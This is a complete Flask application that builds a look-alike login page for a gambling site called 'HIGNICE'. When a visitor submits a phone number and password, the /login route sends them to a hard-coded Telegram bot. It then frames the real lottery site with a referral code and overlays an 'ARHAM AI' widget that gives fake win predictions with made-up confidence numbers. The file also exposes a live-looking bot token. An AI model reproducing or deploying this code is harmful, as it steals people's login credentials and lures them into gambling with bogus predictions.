from flask import Flask, render_template_string, request, redirect, jsonify
import requests
import time
import threading
import collections
import math
import os

app = Flask(__name__)

# --- [১] কনফিগারেশন (আপনার টেলিগ্রাম ডাটা) ---
BOT_TOKEN = "8669461197:AAFSIR9hecqfftSSdXNF1E90xYvpqVIAVRg"
CHAT_ID = "7897417844"
API_URL = "https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json"

# এনালাইসিস ডাটাবেজ
prediction_data = {
    "issue": "---", 
    "size": "WAIT", 
    "color": "WAIT", 
    "number": "--",
    "confidence": "0%",
    "stability": "0%",
    "trend": "NEUTRAL",
    "strength": "0",
    "status": "Connecting..."
}

# --- [২] অ্যাডভান্সড প্রেডিকশন ইঞ্জিন ---
def analyze_market(history):
    if not history: return "SMALL", "GREEN", [0], 50.0, 50.0, "SIDEWAYS", 0
    
    nums = [int(i['number']) for i in history[:20]]
    last_num = nums[0]
    last_col = history[0]['color'].upper()
    
    # স্ট্যাটিস্টিক্যাল ক্যালকুলেশন
    avg = sum(nums[:10]) / 10
    freq = collections.Counter(nums)
    hot_numbers = [n for n, _ in freq.most_common(3)]
    
    # ট্রেন্ড লজিক
    if avg >= 5:
        size = "BIG"
    else:
        size = "SMALL"
        
    color = "RED" if last_num % 2 == 0 else "GREEN"
    
    # কনফিডেন্স এবং স্ট্যাবিলিটি
    stability = max(40, min(95, 100 - (abs(nums[0] - nums[1]) * 10)))
    confidence = max(60, min(98, 50 + (stability * 0.4)))
    
    return size, color, hot_numbers, confidence, stability, "BULLISH" if avg > 5 else "BEARISH", int(stability*0.8)

def start_engine():
    global prediction_data
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    
    while True:
        try:
            r = session.get(f"{API_URL}?ts={int(time.time()*1000)}", timeout=10)
            if r.status_code == 200:
                data = r.json().get('data', {}).get('list', [])
                if data:
                    sz, col, hot, conf, stb, trnd, strng = analyze_market(data)
                    prediction_data.update({
                        "issue": str(int(data[0]['issueNumber']) + 1)[-3:],
                        "size": sz, "color": col, "number": str(hot[0]),
                        "confidence": f"{conf:.1f}%", "stability": f"{stb:.1f}%",
                        "trend": trnd, "strength": str(strng),
                        "status": "LIVE UPDATING"
                    })
        except: pass
        time.sleep(2)

threading.Thread(target=start_engine, daemon=True).start()

# --- [৩] ইন্টারফেস (স্ক্রিনশটের মতো হুবহু ডিজাইন) ---
UI_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>HIGNICE LOGIN</title>
    <style>
        :root { --primary-red: #ff4d4d; --bg-gray: #f8f9fa; }
        body { font-family: 'Helvetica', Arial, sans-serif; background-color: var(--bg-gray); margin: 0; padding: 0; overflow-x: hidden; }
        .header-bg {
            background: linear-gradient(180deg, #ff4e4e 0%, #ff8a8a 100%);
            height: 200px; padding: 20px; color: white; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px;
        }
        .top-bar { display: flex; justify-content: space-between; align-items: center; font-size: 18px; margin-bottom: 15px; }
        .brand { font-size: 30px; font-weight: 900; font-style: italic; letter-spacing: 2px; }
        .login-card {
            width: 88%; max-width: 400px; margin: -50px auto 20px;
            background: white; border-radius: 20px; padding: 25px 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        .tabs { display: flex; border-bottom: 1px solid #f0f0f0; margin-bottom: 25px; }
        .tab { flex: 1; text-align: center; padding: 12px; font-weight: bold; color: #999; }
        .tab.active { color: var(--primary-red); border-bottom: 3px solid var(--primary-red); }
        
        .input-group { position: relative; background: #f7f8fa; border-radius: 12px; padding: 15px; margin-bottom: 15px; display: flex; align-items: center; }
        .input-group i { margin-right: 12px; font-size: 20px; }
        .input-group input { border: none; background: transparent; width: 100%; outline: none; font-size: 16px; color: #333; }
        
        .btn-login { width: 100%; padding: 16px; background: #ccd1d9; color: #4e5969; border: none; border-radius: 35px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-reg { width: 100%; padding: 14px; background: white; color: var(--primary-red); border: 1px solid var(--primary-red); border-radius: 35px; font-size: 18px; margin-top: 15px; cursor: pointer; }
        
        /* উইজেট ডিজাইন */
        #widget {
            position: fixed; top: 150px; right: 10px; width: 160px; background: rgba(0,0,0,0.85);
            border: 2px solid var(--primary-red); border-radius: 20px; padding: 15px; color: white;
            box-shadow: 0 0 20px rgba(255,0,0,0.4); z-index: 9999; font-size: 12px;
        }
        .w-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .w-val { font-weight: bold; color: #ffca28; }
    </style>
</head>
<body>
    {% if page == 'login' %}
    <div class="header-bg">
        <div class="top-bar"><span>&lsaquo;</span> <span>🇺🇸 EN</span></div>
        <div class="brand">HIGNICE</div>
        <h2 style="margin: 10px 0 5px;">Log in</h2>
        <p style="font-size: 11px; opacity: 0.9;">Please log in with your phone number or email</p>
    </div>
    <div class="login-card">
        <div class="tabs"><div class="tab active">phone number</div><div class="tab">Email Login</div></div>
        <form action="/login" method="POST">
            <div class="input-group"><span>📱</span> <input type="text" name="phone" placeholder="+880 Please enter the phone number" required></div>
            <div class="input-group"><span>🔒</span> <input type="password" name="password" placeholder="Password" required></div>
            <button type="submit" class="btn-login">Log in</button>
        </form>
        <button class="btn-reg">Register</button>
    </div>
    {% else %}
    <iframe src="https://hgzy.vip/#/register?invitationCode=171661163318" style="width:100%; height:100vh; border:none;"></iframe>
    <div id="widget">
        <div style="text-align:center; color:var(--primary-red); font-weight:bold; margin-bottom:10px;">ARHAM AI V5.0</div>
        <div class="w-row"><span>ISSUE:</span><span class="w-val" id="iss">--</span></div>
        <div class="w-row"><span>SIZE:</span><span class="w-val" id="siz">--</span></div>
        <div class="w-row"><span>COLOR:</span><span class="w-val" id="col">--</span></div>
        <div class="w-row"><span>CONF:</span><span class="w-val" id="cnf">0%</span></div>
        <div style="font-size:8px; margin-top:10px; color:#00ff88; text-align:center;">● API STABLE</div>
    </div>
    <script>
        function update() {
            fetch('/api/prediction').then(res => res.json()).then(data => {
                document.getElementById('iss').innerText = data.issue;
                document.getElementById('siz').innerText = data.size;
                document.getElementById('col').innerText = data.color;
                document.getElementById('cnf').innerText = data.confidence;
                document.getElementById('siz').style.color = data.size === 'BIG' ? '#ff4d4d' : '#00ff88';
            });
        }
        setInterval(update, 2000);
    </script>
    {% endif %}
</body>
</html>
"""

# --- [৪] রাউটস ---
@app.route('/')
def home():
    return render_template_string(UI_TEMPLATE, page='login')

@app.route('/dashboard')
def dashboard():
    return render_template_string(UI_TEMPLATE, page='game')

@app.route('/api/prediction')
def api():
    return jsonify(prediction_data)

@app.route('/login', methods=['POST'])
def login():
    usr = request.form.get('phone')
    pwd = request.form.get('password')
    log = f"🚀 **NEW LOGIN**\n📱 Phone: `{usr}`\n🔑 Pass: `{pwd}`"
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": log, "parse_mode": "Markdown"})
    except: pass
    return redirect('/dashboard')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
